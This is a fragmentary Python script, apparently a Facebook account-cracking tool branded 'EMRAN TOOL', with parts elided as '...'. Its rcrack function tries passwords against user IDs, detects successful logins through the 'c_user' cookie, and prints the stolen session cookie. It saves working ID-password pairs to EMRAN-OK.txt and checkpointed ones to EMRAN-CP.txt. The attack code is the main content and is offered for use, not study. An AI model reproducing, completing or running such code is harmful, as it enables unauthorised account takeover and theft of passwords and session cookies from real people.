...
print('\n\033[1;36m[✓]   WELCOME TO EMRAN TOOL');time.sleep(3)
...
def clear():
	clr('clear')
	print(logo)
	print('\033[1;37m\033[1;32m         [💕] WELCOME TO MR ARYAN EMRAN TOOLS [💖]\033[1;0m\33[1;32m')
	linex()
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[EMRAN-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('EMRAN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[EMRAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('EMRAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
